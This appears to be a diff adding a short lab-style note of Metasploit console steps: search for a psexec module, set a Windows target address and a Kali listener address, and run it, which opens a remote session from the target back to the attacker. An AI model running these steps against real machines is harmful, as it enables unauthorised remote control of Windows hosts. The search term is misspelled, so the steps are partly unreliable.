@@ -1,0 +1,6 @@
+msfconsole
+search psc xec
+use 1
+set RHOST (windows  ip)
+set LHOST (kali ip)
+Run
